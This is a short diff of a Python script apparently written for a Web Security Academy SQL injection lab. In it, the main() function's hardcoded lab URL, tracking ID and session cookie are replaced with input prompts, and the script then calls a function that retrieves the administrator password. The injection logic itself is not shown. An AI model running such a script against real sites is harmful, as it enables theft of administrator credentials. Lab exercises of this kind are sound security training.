@@ -26,9 +26,9 @@ def sqli_password(url, trackingId, session):
 
 
 def main():
-    url = "https://ac401f061ff3fa2ac0134d720099004b.web-security-academy.net/" #input("Enter url: ")
-    trackingId = "6iBhMvUkuuqfZi3b" #input("Enter TrackingId: ")
-    session = "4fR8uA7gDGcJQyP0Ozjdk07JKyPiLqow" #input("Enter session: ")
+    url = input("Enter url: ")
+    trackingId = input("Enter TrackingId: ")
+    session = input("Enter session: ")
     print("(+) Retrieving administrator password...")
     sqli_password(url, trackingId, session)
 
